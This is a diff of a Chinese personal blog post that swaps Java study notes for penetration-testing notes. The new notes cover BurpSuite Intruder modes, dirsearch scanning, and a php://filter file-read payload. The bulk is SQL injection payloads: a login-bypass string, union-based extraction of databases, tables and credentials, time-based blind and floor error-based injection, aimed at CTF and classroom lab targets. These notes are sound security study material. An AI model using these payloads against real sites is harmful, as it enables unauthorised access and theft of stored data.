@@ -6,17 +6,17 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>初窥Java | 韩枫的博客</title>
+  <title>学习笔记 | 韩枫的博客</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="Java学习">
+  <meta name="description" content="学习">
 <meta property="og:type" content="article">
-<meta property="og:title" content="初窥Java">
-<meta property="og:url" content="http://example.com/2023/04/26/Java%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:title" content="学习笔记">
+<meta property="og:url" content="http://example.com/2024/11/08/%E5%AD%A6%E4%B9%A0/index.html">
 <meta property="og:site_name" content="韩枫的博客">
-<meta property="og:description" content="Java学习">
+<meta property="og:description" content="学习">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2023-04-25T16:27:28.864Z">
-<meta property="article:modified_time" content="2023-04-25T17:30:37.381Z">
+<meta property="article:published_time" content="2024-11-08T09:20:12.100Z">
+<meta property="article:modified_time" content="2024-11-08T11:03:30.265Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
   
@@ -167,14 +167,14 @@
           </div>
           <div id="js-content" class="content-ll">
             
-<article id="post-Java学习" class="article article-type-post " itemscope itemprop="blogPost">
+<article id="post-学习" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      初窥Java
+      学习笔记
     </h1>
   
 
@@ -189,112 +189,179 @@
         </a>
         
         
-        <a href="/2023/04/26/Java%E5%AD%A6%E4%B9%A0/" class="archive-article-date">
-  	<time datetime="2023-04-25T16:27:28.864Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-04-26</time>
+        <a href="/2024/11/08/%E5%AD%A6%E4%B9%A0/" class="archive-article-date">
+  	<time datetime="2024-11-08T09:20:12.100Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-11-08</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="Java学习"><a href="#Java学习" class="headerlink" title="Java学习"></a>Java学习</h1><span id="more"></span>
+        <h1 id="学习"><a href="#学习" class="headerlink" title="学习"></a>学习</h1><span id="more"></span>
 
-<h2 id="2023年2月17日-4月2日："><a href="#2023年2月17日-4月2日：" class="headerlink" title="2023年2月17日-4月2日："></a>2023年2月17日-4月2日：</h2><h3 id="1-前言："><a href="#1-前言：" class="headerlink" title="1. 前言："></a>1. 前言：</h3><p>花了俩个月深入学习了Java， 有C语言基础的我感觉Java上手很快，话不多说，直接上总结</p>
-<h3 id="2-Java开发工具"><a href="#2-Java开发工具" class="headerlink" title="2. Java开发工具"></a>2. Java开发工具</h3><p><strong>javac</strong>： java编辑器<br><strong>java</strong>： java解释器<br><strong>jdb</strong>： java调试器<br><strong>javap</strong>： 主要用于反编译<br><strong>javadoc</strong>：文档生成器  </p>
-<h3 id="3-cmd命令"><a href="#3-cmd命令" class="headerlink" title="3. cmd命令"></a>3. cmd命令</h3><ul>
-<li><strong>E:</strong> ：切换盘符</li>
-<li><strong>dir</strong> ：显示文件</li>
-<li><strong>cd</strong> ：进入</li>
-<li><strong>cd..</strong> ：后退</li>
-<li><strong>cd\目录\目录</strong>： 多层进入</li>
-<li><strong>cls</strong> ： 清空界面</li>
-<li><strong>exit</strong> ：退出</li>
-</ul>
-<h3 id="4-java工具Notepad"><a href="#4-java工具Notepad" class="headerlink" title="4. java工具Notepad"></a>4. java工具Notepad</h3><p>配置notepad：设置—首选项—新建—window，java，ANSI</p>
-<h3 id="5-变量命名默认规则"><a href="#5-变量命名默认规则" class="headerlink" title="5. 变量命名默认规则"></a>5. 变量命名默认规则</h3><table>
-<thead>
-<tr>
-<th align="center">名称</th>
-<th align="center">命名</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">接口和类名</td>
-<td align="center">首字母大写</td>
-</tr>
-<tr>
-<td align="center">方法名和变量名</td>
-<td align="center">首个字母小写，其余大写</td>
-</tr>
-<tr>
-<td align="center">常量名</td>
-<td align="center">全大写</td>
-</tr>
-<tr>
-<td align="center">包</td>
-<td align="center">小写</td>
-</tr>
-</tbody></table>
-<h3 id="6-导包类（这里Scanner为例子）"><a href="#6-导包类（这里Scanner为例子）" class="headerlink" title="6. 导包类（这里Scanner为例子）"></a>6. 导包类（这里Scanner为例子）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import java.util.Scanner;</span><br><span class="line">Scanner 名 = new Scanner(System.in);</span><br><span class="line">int 变量 = 名.nextInt();  </span><br></pre></td></tr></table></figure>
-<h3 id="7-语法（与C类似，-由于是给自己看的，-只写不一样的）"><a href="#7-语法（与C类似，-由于是给自己看的，-只写不一样的）" class="headerlink" title="7. 语法（与C类似， 由于是给自己看的， 只写不一样的）"></a>7. 语法（与C类似， 由于是给自己看的， 只写不一样的）</h3><ul>
-<li>swich可以简化： case -&gt; {}</li>
-<li>数组定义 ： int[] arrey &#x3D; new int[]{}; or int arrey[] &#x3D; {};</li>
-<li>private: 只能在本类中访问（可以用this区别全局变量和局部变量）</li>
-</ul>
-<h3 id="8-构造器"><a href="#8-构造器" class="headerlink" title="8. 构造器"></a>8. 构造器</h3><p>构造方法：与类名相同，无返回值连void都没有，需要写无参构造和有参构造，系统默认有一个无参构造<br>构造代码块先于构造方法执行<br>静态代码块static{}随着类的加载而加载，只出现一次，一般用于数据初始化</p>
-<h3 id="9-继承"><a href="#9-继承" class="headerlink" title="9. 继承"></a>9. 继承</h3><p>java只能单继承不能多继承，但支持多层继承<br>object是祖宗类<br>this(本类)<br>super(父类)<br>重写（Override）和重载(overload)： 俩者参数列表区别<br>public&gt;protected&gt;(default)&gt;private</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public class zi extends fu&#123;</span><br><span class="line">    //zi类选择重写fu类方法(抽象类必须重写)</span><br><span class="line">    //构造方法先fu后zi, super只能有一个且必须是第一个</span><br><span class="line">    //final变量为常量类不能被继承，方法不能被覆盖</span><br><span class="line">    //抽象类不能new,抽象方法所在的类必是抽象类</span><br><span class="line">    //必须用一个子类继承抽象父类</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="10-接口-interface"><a href="#10-接口-interface" class="headerlink" title="10. 接口(interface)"></a>10. 接口(interface)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">//实现接口</span><br><span class="line">class GameJFrame extends JFrame implements KeyListener, ActionListener&#123;&#125;</span><br><span class="line">public interface A &#123;</span><br><span class="line">    //接口默认方法</span><br><span class="line">    public default void method() &#123;</span><br><span class="line">        System.out.println(&quot;A&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    //抽象方法</span><br><span class="line">    public void actionPerformed(ActionEvent e);</span><br><span class="line">    //静态方法（只能通过接口名调用）</span><br><span class="line">    public static void show()&#123;</span><br><span class="line">        System.out.println(&quot;static&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    //私有方法</span><br><span class="line">    private (static) void method2()&#123;</span><br><span class="line">        //重复代码块</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">接口无静态代码块和构造方法</span><br><span class="line">一个类可以有多个接口，重名必须重写，调用接口.super.方法</span><br><span class="line">父类与接口方法冲突，优先父类</span><br></pre></td></tr></table></figure>
-<h3 id="11-多态"><a href="#11-多态" class="headerlink" title="11. 多态"></a>11. 多态</h3><p>多态成员方法：编译看左边，运行看右边<br>多态成员变量：编译看左边，运行看左边</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Animal a = new Dog();</span><br><span class="line">if(a instanceof Dog)&#123;&#125;//比较类型(bool类型)</span><br><span class="line">if(a instanceof Dog d)&#123;&#125;//比较类型true则强转为d</span><br></pre></td></tr></table></figure>
-<h3 id="12-内部类"><a href="#12-内部类" class="headerlink" title="12. 内部类"></a>12. 内部类</h3><ul>
-<li>内部类<ol>
-<li>成员内部类</li>
-<li>静态内部类</li>
-<li>局部内部类</li>
-<li>匿名内部类<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Outer.Inner oi = new Outer().new Inner();</span><br><span class="line">//外部成员与内部成员重名</span><br><span class="line">Outer.this.变量</span><br></pre></td></tr></table></figure></li>
-</ol>
-</li>
-</ul>
-<h3 id="13-异常"><a href="#13-异常" class="headerlink" title="13. 异常"></a>13. 异常</h3><h5 id="Exception分为："><a href="#Exception分为：" class="headerlink" title="Exception分为："></a>Exception分为：</h5><ul>
-<li>运行时异常（RuntimeException）</li>
-<li>编译时异常</li>
-</ul>
-<h5 id="异常的作用："><a href="#异常的作用：" class="headerlink" title="异常的作用："></a>异常的作用：</h5><ul>
-<li>查询bug的关键参考信息 </li>
-<li>作为一种特殊返回值，以便通知调用者底层的执行情况</li>
-</ul>
-<h5 id="异常的处理"><a href="#异常的处理" class="headerlink" title="异常的处理"></a>异常的处理</h5><ul>
-<li>JVM默认处理<ul>
-<li>把异常的名称，原因，错误位置输出在控制台上</li>
-<li>后序代码停止执行</li>
-</ul>
-</li>
-<li>自己处理（捕获异常）  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="comment">//可能出现异常的代码;</span></span><br><span class="line">    <span class="comment">//系统自动创建错误对象，然后拿到catch中对比</span></span><br><span class="line">&#125;<span class="keyword">catch</span>(异常类名 变量名)&#123;</span><br><span class="line">    <span class="comment">//异常处理的代码;</span></span><br><span class="line">    <span class="comment">//如果能接收及被捕获，则执行对应catch代码）</span></span><br><span class="line">    <span class="comment">//Throwtable的成员方法</span></span><br><span class="line">        <span class="comment">//public String getMessage(): 返回详细信息</span></span><br><span class="line">        <span class="comment">//public String toString(): 返回此可抛出的简短描述</span></span><br><span class="line">        <span class="comment">//public void printStackTrace():利用System.err.println打印红色</span></span><br><span class="line">&#125;<span class="keyword">finally</span>&#123;</span><br><span class="line">    <span class="comment">//无论是否出现异常，该代码块中代码都会执行</span></span><br><span class="line">    sout(balabala);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//可以让程序继续往下执行，不会停止</span></span><br></pre></td></tr></table></figure>
+<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p><strong>配置JAVA:</strong></p>
+<blockquote>
+<p>安装Java配置path（JAVA_HOME）</p>
+</blockquote>
+<p><strong>启动BurpSuite</strong></p>
+<blockquote>
+<p>启动burp_start.bat(这里我的jdk版本过高，于是把里面内容改成了<br>@echo off<br>cmd &#x2F;k “G:\tool\BurpSuite\jdk-11.0.11\bin\java.exe -jar BurpLoaderKeygen.jar”)<br>注意jdk版本11.0.11</p>
+</blockquote>
+<p>X-Forwarded-For: 127.0.0.1</p>
+<p><strong>配置PHPstudy</strong></p>
+<blockquote>
+<p>安装后启动WNMP，启动Apache和Mysql（mysql我之前有下载因此有冲突启动不了，打开cmd输入service.msc把MySQL停止掉就ok了）</p>
+</blockquote>
+<p><strong>intruder模式：</strong></p>
 <ol>
-<li>如果try中没有遇到问题则正常执行</li>
-<li>如果try中多个问题则多个catch（父类异常写下面）否则默认JVM</li>
-<li>try中遇到问题try中后面的代码不运行</li>
+<li>默认为sniper模式，即如果有多个变量，对每个变量依次进行破解，一次只替换一个变量<br>也就是说，如果有username 和password两个变量，那么它会先对username进行爆破,<br>password字段不会改变，然后username不变，再对password字段进行爆破</li>
+<li>Batterin gram模式:对多个变量同时进行破解<br>比如有username和password两个字段，使用字典进行破解，那么每次都会用字典中的一个值将两个变量同时替换</li>
+<li>pitchfork模式:每个变量对应一一个字典，比如username和password,依次取其对应的字典中的一条数据对相应变量进行替换,如果两个字典条数不-样,那公一共会执行条数较少的那么多次，即不会交叉替换，只会按每个字典的顺序进行替换</li>
+<li>Cluster bomb模式:这种模式在pitchfork模式上进行了改进，即把不同变量对应的字典<br>中的值进行了排列组合，实现了不同的组合攻击</li>
 </ol>
+<h2 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch:"></a>dirsearch:</h2><p><strong>dirsearch安装(D:\git\Git\bin)：</strong></p>
+<blockquote>
+<p>.\git clone <a target="_blank" rel="noopener" href="https://github.com/maurosoria/dirsearch.git">https://github.com/maurosoria/dirsearch.git</a><br>cd dirsearch<br>pip3 install -r requirements.txt</p>
+</blockquote>
+<p><strong>kali安装：</strong></p>
+<blockquote>
+<p>apt-get install dirsearch </p>
+</blockquote>
+<p><strong>使用：</strong></p>
+<blockquote>
+<p>dirsearch -u <a target="_blank" rel="noopener" href="https://www.example.com/">https://www.example.com/</a> -e php,json,txt<br>-u参数指定目标网站,-e参数指定要扫描的后缀名<br>通过w参数指定字典<br>dirsearch -u <a target="_blank" rel="noopener" href="http://www.example.com/">http://www.example.com</a> -w &#x2F;path&#x2F;to&#x2F;your&#x2F;wordlist.txt<br>忽略扩展名和目录<br>dirsearch -u <a target="_blank" rel="noopener" href="http://www.example.com/">http://www.example.com</a> –ignore-ext php,jpg –ignore-dir admin,uploads<br>设置超时时间<br>dirsearch -u <a target="_blank" rel="noopener" href="http://www.example.com/">http://www.example.com</a> -t 30<br>递归扫描子目录<br>dirsearch -u <a target="_blank" rel="noopener" href="http://www/">http://www</a> example.com -r</p>
+</blockquote>
+<p><strong>dirsearch会将扫描结果保存在当前目录下的results目录中，每个结果都有详细的信息，包括HTTP状态、请求URL、响应大小等。</strong></p>
+<p><strong>样例:</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Target: [https://www.example.com/](https://www.example.com/)</span><br><span class="line">Code: 200 Length: 78240 Response: OK</span><br><span class="line">URL: [https://www.example.com/index.php](https://www.example.com/index.php)</span><br><span class="line">Wordlist: /path/to/your/wordlist.txt</span><br><span class="line">Code表示服务器返回的HTTP状态码，</span><br><span class="line">Length表示服务器返回的响应大小，</span><br><span class="line">Response显示服务器返回的信息</span><br></pre></td></tr></table></figure>
+
+<p><strong>sql注入-union联合注入</strong></p>
+<blockquote>
+<p>万能密码:<br>1’ or 1&#x3D;1 # (有可能是双引号，需要引号为字符型反之为数字型)</p>
+</blockquote>
+<blockquote>
+<p>了解字段:<br>‘order by n # (n为字段数，当n+1时报错)</p>
+</blockquote>
+<blockquote>
+<p>回显:<br>利用union select 1,2,3…判断回显位，如果有回显，找到回显位，回显位也就是回显页面有我们设置的1,2,3的位置</p>
+</blockquote>
+<blockquote>
+<p>爆库:<br>-1’ union select 1,(select database()),3;#(select后面n-1个数然后注入代码)</p>
+</blockquote>
+<blockquote>
+<p>爆表:<br>-1’ union select 1,(select group_concat(table_name)from information_schema.tables where table_schema&#x3D;database()),3;#</p>
+</blockquote>
+<blockquote>
+<p>爆出m个表，选择爆users表<br>-1’ union select 1,(select group_concat(column_name)from information_schema.columns where table_name&#x3D;’users’),3;#</p>
+</blockquote>
+<blockquote>
+<p>爆字段的数据<br>-1’ union select 1,(select group_concat(id,username,password) from users),3;#<br>或者index.php?id&#x3D;999’union select 1,database(),fllllag from fl4g%23<br>union select 1,flag,n from flag</p>
+</blockquote>
+<p>注意：（为什么用-1 ：因为-1大概率会返回空表，union select联合查询会返回一张表，就只会显示后面联合查询表）<br>如果发现查询出了很多字段应该爆错了不是我们需要的那个表，可能其他库里也有users表，这样要加一条限制语句，查security库里的users表</p>
+<blockquote>
+<p>-1’ union select 1,(select group_concat(column_name)from information_schema.columns where table_schema&#x3D;’security’ and table_name&#x3D;’users’),3 –+</p>
+</blockquote>
+<p><strong>文件包含</strong></p>
+<p>?url&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x2F;convert.base64-encode&#x2F;resource&#x3D;index.php<br><a href="G:/md文件/伪协议.png">文件包含</a></p>
+<p>allinurl:tsweb&#x2F;default.htm site:com<br>X-Forwarded-For:127.0.0.1(伪造本地访问，User-Agent后面加)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /Secret.php HTTP/1.1</span><br><span class="line">Host: node5.buuoj.cn:28087</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent:Syclover</span><br><span class="line">X-Forwarded-For:127.0.0.1</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Referer:https://Sycsecret.buuoj.cn</span><br></pre></td></tr></table></figure>
+
+<h2 id="网络攻击与防御"><a href="#网络攻击与防御" class="headerlink" title="网络攻击与防御"></a>网络攻击与防御</h2><h3 id="sql注入讲解"><a href="#sql注入讲解" class="headerlink" title="sql注入讲解"></a>sql注入讲解</h3><p><strong>1、数字型注入<a target="_blank" rel="noopener" href="http://222.18.158.243:4601/">http://222.18.158.243:4601/</a></strong></p>
+<ul>
+<li>找注入参数：</li>
+</ul>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://222.18.158.243:4601/?id=1">http://222.18.158.243:4601/?id=1</a> and 1&#x3D;1 #显示正常<br><a target="_blank" rel="noopener" href="http://222.18.158.243:4601/?id=1">http://222.18.158.243:4601/?id=1</a> and 1&#x3D;2 #显示不正常，页面不回显字段内容，SQL语句本身已经在页面上有显示</p>
+</blockquote>
+<br>
+
+<p><strong>2、字段个数为3：</strong></p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://222.18.158.243:4601/?id=1">http://222.18.158.243:4601/?id=1</a> order by 4– ss #显示不正常<br><a target="_blank" rel="noopener" href="http://222.18.158.243:4601/?id=1">http://222.18.158.243:4601/?id=1</a> order by 3– ss #显示正常<br>如果order by 跟的数字小于等于字段实际个数，显示正常，此处可以使用10，5，2，等来进行折半查找。</p>
+</blockquote>
+<br>
+
+<h4 id="课堂实践"><a href="#课堂实践" class="headerlink" title="课堂实践"></a>课堂实践</h4><p><strong>3、字段精确位置：</strong></p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://222.18.158.243:4601/?id=1">http://222.18.158.243:4601/?id=1</a> union select 1,2,3– sd #2，3显示<br>and 1&#x3D;2，使union之前的select语句报错，从而执行后面的语句。也可改为?id&#x3D;-1<br>union :UNION 操作符用于合并两个或多个 SELECT 语句的结果集，UNION 内部的 SELECT 语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每条 SELECT 语句中的列的顺序必须相同。</p>
+</blockquote>
+<br>
+
+<p><strong>4、数据库名sql_db和用户名sql_user@localhost：</strong></p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://222.18.158.243:4601/?id=1">http://222.18.158.243:4601/?id=1</a> and 1&#x3D;2 union select 1,database(),user()– sd</p>
+</blockquote>
+<ul>
+<li>或者</li>
+</ul>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://222.18.158.243:4601/?id=1">http://222.18.158.243:4601/?id=1</a> and 1&#x3D;2 union select 1,2,SCHEMA_NAME from information_schema.SCHEMATA limit 1,1– ss<br>在2、3字段中显示数据库名或者用户名信息<br>limit 1,1表示选择第2个开始，只显示1个。<br>limit 0,1表示选择第1个开始，只显示1个。</p>
+</blockquote>
+<ul>
+<li>或者</li>
+</ul>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://222.18.158.243:4601/?id=1">http://222.18.158.243:4601/?id=1</a> and 1&#x3D;2 union select 1,2,group_concat(SCHEMA_NAME) from information_schema.SCHEMATA – sd</p>
+</blockquote>
+<p><strong>group_concat()函数</strong></p>
+<p>语法：</p>
+<blockquote>
+<p>group_concat( [distinct] 要连接的字段 [order by 排序字段 asc&#x2F;desc] [separator ‘分隔符’] )</p>
+</blockquote>
+<p><strong>说明：通过使用distinct可以排除重复值；如果希望对结果中的值进行排序，可以使用order by子句；separator是一个字符串值，缺省为一个逗号。</strong></p>
+<p><strong>5、表名flag</strong></p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://222.18.158.243:4601/?id=1">http://222.18.158.243:4601/?id=1</a> and 1&#x3D;2 union select 1,2,TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA&#x3D;database() limit 1,1– ss<br>或者TABLE_SCHEMA&#x3D;’sql_db’<br>或者TABLE_SCHEMA&#x3D; 0x73716c5f6462， sql_db的十六进制。用Hackbar插件可修改<br>数据库中有很多表，可以通过limit 0,1或limit 1,1来控制</p>
+</blockquote>
+<p><strong>6、字段名flag：</strong></p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://222.18.158.243:4601/?id=1">http://222.18.158.243:4601/?id=1</a> and 1&#x3D;2 Union select 1,2,COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME&#x3D;’flag’ limit 1,1– ss </p>
+</blockquote>
+<p><strong>7、字段内容：</strong></p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://222.18.158.243:4601/">http://222.18.158.243:4601/</a><br>?id&#x3D;1 and 1&#x3D;2 union select 1,id,flag from flag– ss<br>?id&#x3D;1 and 1&#x3D;2 可以替换为?id&#x3D;-1<br>select 1,id,flag 可以替换为select 1,flag,3</p>
+</blockquote>
+<p><strong>8、字符型注入<a target="_blank" rel="noopener" href="http://222.18.158.243:4602/">http://222.18.158.243:4602/</a></strong></p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://222.18.158.243:4602/?id=1">http://222.18.158.243:4602/?id=1</a>‘ and 1&#x3D;2 union select 1,database(),user()– sd</p>
+</blockquote>
+<p><strong>9、时间注入</strong></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43531669/article/details/97621251">时间注入</a></p>
+<blockquote>
+<p>时间延迟注入语句<br>SQL Server数据库向查询引入延迟的内置命令：<br>WAITFOR DELAY ‘hours:minutes:seconds’<br><a target="_blank" rel="noopener" href="http://www.xxx.com/xxx.aspx?uid=5;waitfor">http://www.xxx.com/xxx.aspx?uid=5;waitfor</a> delay ‘0:0:5’;–<br>MySQL数据库可以使用执行时间很长的函数来引入延迟。<br>if(left(version(),1)&#x3D;5,sleep(1),1)%23 &#x2F;&#x2F;%23是#的URL编码<br>if(left(database(),1)&#x3D;’s’,sleep(1),1)%23</p>
+</blockquote>
+<ul>
+<li>sqli&#x2F;Less-9</li>
+</ul>
+<blockquote>
+<p>获取数据库版本号的第一位数字<br>and if(left(version(),1)&#x3D;5,sleep(1),1)%23</p>
+</blockquote>
+<blockquote>
+<p>获取数据库版本号的前三位<br>and if(left(version(),3)&#x3D;5.7,sleep(1),1)%23</p>
+</blockquote>
+<blockquote>
+<p>获取用户名的长度<br>and if(length(user())&#x3D;14,sleep(1),1)%23</p>
+</blockquote>
+<blockquote>
+<p>获取用户名的第一位字符<br>and if(left(user(),1)&#x3D;’r’,sleep(1),1)%23</p>
+</blockquote>
+<blockquote>
+<p>获取数据库名的长<br>and if(length(database())&#x3D;8,sleep(1),1)%23</p>
+</blockquote>
+<p><strong>10、Floor报错注入语句</strong></p>
+<ul>
+<li>其实主要就是套公式，公式分为4部分：</li>
+</ul>
+<ol>
+<li>逻辑错误部分，也就是将GET变量取值变为逻辑错误值，例如.php?id&#x3D;0或者.php?id&#x3D;12+and+1&#x3D;2</li>
+<li>固定SQL联合查询语句，语句为：(核心)union select 1 from (select+count(*),concat(floor(rand(0)*2),(注入爆数据语句))a from information_schema.tables group by a)b</li>
+<li>注释语句，将整个语句后面的部分注释掉，可以用”&#x2F;*”注释符，也可以用”–”终止符，也可以用%23这个”#”字符</li>
+<li>注入爆数据语句，基本格式就是select XX from YY的格式<blockquote>
+<p>?id&#x3D;1’ and  (select count(*) from information_schema.tables group by concat(floor(rand()*2),0x23,(database())))–+</p>
+</blockquote>
 </li>
-<li>抛出处理<ul>
-<li>throws：方法开始时告诉使用者可能会出的异常(RuntimeException可不写)</li>
-<li>throw：方法中抛出异常（创建对象）</li>
-</ul>
-</li>
-</ul>
-<h5 id="自定义异常"><a href="#自定义异常" class="headerlink" title="自定义异常"></a>自定义异常</h5><ul>
-<li>定义类</li>
-<li>写继承关系</li>
-<li>空参构造</li>
-<li>带参构造</li>
-</ul>
-<h3 id="14-函数环节"><a href="#14-函数环节" class="headerlink" title="14. 函数环节"></a>14. 函数环节</h3><ul>
-<li>数组求长度： arrey.length;</li>
-<li>Math类(API文档)</li>
-<li>nextLine();单独讲一下， next()遇到空格就不会读取字符串了，但nextLine()只找回车<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">//返回类型 用法</span><br><span class="line">boolean a.equals(b)//比较字符串内容</span><br><span class="line">boolean a.equalsIgnoreCase(b);//忽略大小写比较</span><br><span class="line">char chaAt(int index);//根据索引返回字符</span><br><span class="line">int length();//返回长度</span><br><span class="line">String substring(int beginIndex, int endIndex);//截取（包头不包尾）</span><br><span class="line">String substring(int beginInde);//截取到末尾</span><br><span class="line">String replace(新， 旧);//替换</span><br><span class="line"></span><br><span class="line">//StringBuilder</span><br><span class="line">StringBuilder sb = new StringBuilder();</span><br><span class="line">sb.append(任意类型);//添加</span><br><span class="line">sb.reverse();//反转内容</span><br><span class="line">String toString();//转化为String</span><br><span class="line"></span><br><span class="line">//StringJoiner</span><br><span class="line">String arrey1 = &quot;你好&quot;;</span><br><span class="line">String arrey2 = &quot;朋友&quot;;</span><br><span class="line">StringJoiner a = new StringJoiner(&quot;,&quot;);</span><br><span class="line">StringJoiner a = new StringJoiner(&quot;,&quot;, &quot;[&quot;, &quot;]&quot;);</span><br><span class="line">a.add(arrey1);</span><br><span class="line">a.add(arrey2);</span><br><span class="line">sout(a);//你好,朋友</span><br><span class="line">sout(a);//[你好,朋友]</span><br><span class="line"></span><br><span class="line">//ArrayList(集合)(Byte, Short, Character, Integer, Long, Float, Double, Boolean)</span><br><span class="line">ArrayList&lt;String&gt; arrayList = new ArrayList&lt;String&gt;();</span><br><span class="line">arrayList.add(&quot;1&quot;);//添加</span><br><span class="line">arrayList.add(&quot;2&quot;);</span><br><span class="line">arrayList.remove(&quot;2&quot;);//删除</span><br><span class="line">System.out.println(arrayList);//[1]</span><br><span class="line">arrayList.add(&quot;3&quot;);</span><br><span class="line">System.out.println(arrayList.remove(1));//3，删除指定并返回被删除内容</span><br><span class="line">System.out.println(arrayList.set(0, &quot;4&quot;));//1，修改指定返回被修改内容</span><br><span class="line">System.out.println(arrayList.get(0));//4，获取</span><br><span class="line">System.out.println(arrayList.size());//1，长度</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h3 id="14-其他知识点（由于吃过亏，因此记录一下）"><a href="#14-其他知识点（由于吃过亏，因此记录一下）" class="headerlink" title="14.  其他知识点（由于吃过亏，因此记录一下）"></a>14.  其他知识点（由于吃过亏，因此记录一下）</h3><p>如何将字符数组，字节数组转化为字符串： String s &#x3D; new String(chs&#x2F;bytes)<br>&#x3D;&#x3D; 比较引用类型比较的是地址<br>static用于class类公用（与对象无关，类名调用）<br>float定义时数值后加F， long定义时数值后加L<br>main函数可以手动调用</p>
+</ol>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45305211/article/details/127515012">floor注入</a></p>
 
       
 
@@ -384,7 +451,7 @@
